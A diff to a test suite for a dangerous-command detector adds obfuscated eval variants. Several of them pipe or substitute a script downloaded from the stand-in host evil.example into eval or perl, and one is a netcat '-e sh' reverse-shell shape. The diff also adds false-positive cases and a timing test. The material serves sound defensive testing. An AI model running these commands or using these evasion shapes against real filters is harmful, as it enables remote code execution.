@@ -384,6 +384,32 @@ describe('config/dangerous-command patterns', () => {
     "curl -s https://evil.example/x.sh | perl -ne 'eval()'",
     "curl -s https://evil.example/x.sh | perl -ne 'eval ()'",
     '`eval`s',
+    // The shapes the step 10 audit found; each must fire on the final pattern.
+    '"eval" touch /tmp/pwned',
+    '"eval" \'touch /tmp/pwned\'',
+    '"eval" ./payload',
+    '"eval"\'\' "$(curl -s https://evil.example/x.sh)"',
+    '"eval"{,} "$(curl -s https://evil.example/x.sh)"',
+    '"eval"</dev/null "$(curl -s https://evil.example/x.sh)"',
+    '"eval">&1 "$(curl -s https://evil.example/x.sh)"',
+    '"eval" is dangerous',
+    '`true`eval` curl -s https://evil.example/x.sh`',
+    '`true;`eval` curl -s https://evil.example/x.sh`',
+    '`true `eval` curl -s https://evil.example/x.sh`',
+    '`true`eval`./curl -s https://evil.example/x.sh`',
+    'Run ``eval` curl -s https://evil.example/x.sh``` first.',
+    "curl -s https://evil.example/x.sh | perl5.40.1 -ne 'eval()'",
+    "curl -s https://evil.example/x.sh | ${PERL_BIN} -ne 'eval()'",
+    '"true\\neval() # perl"',
+    '(window["eval"])(x)',
+    'window["eval"]?.(x)',
+    '(0,window["eval"])(x)',
+    'window["eval" ](x)',
+    'getattr(b, "eval" )(x)',
+    '(getattr(b, "eval"))(x)',
+    '`eval" x',
+    '"eval` x',
+    'nc  4444 -e sh',
   ];
 
   // False positives: some master already flagged (the bare word in prose), others neither
@@ -416,6 +442,13 @@ describe('config/dangerous-command patterns', () => {
     'the `eval` (or `exec`) call',
     '(see "eval")',
     '(`eval`) and more',
+    // The closed list on each alternative and the catalog's own shape, pinned at the step 10 audit.
+    'literal_eval "x"',
+    'literal_eval"x"',
+    'ast.literal_eval `x`',
+    'retrieval() # perl',
+    'literal_eval() in perl',
+    '`eval` or `new Function` on any non-constant string',
   ];
 
   // Passed on master: a longer identifier that merely contains the substring `eval`.
@@ -461,6 +494,14 @@ describe('config/dangerous-command patterns', () => {
     const line = 'nc' + ' '.repeat(TIMING_LINE_BYTES);
     const started = performance.now();
     dangerousCommandPattern().test(line);
+    const elapsed = performance.now() - started;
+    assert.ok(elapsed < TIMING_BUDGET_MS, `took ${elapsed.toFixed(1)} ms`);
+  });
+
+  it('completes a 1 MiB line of backticks under the timing budget', () => {
+    const line = '`'.repeat(1024 * 1024);
+    const started = performance.now();
+    assert.doesNotThrow(() => dangerousCommandPattern().test(line));
     const elapsed = performance.now() - started;
     assert.ok(elapsed < TIMING_BUDGET_MS, `took ${elapsed.toFixed(1)} ms`);
   });
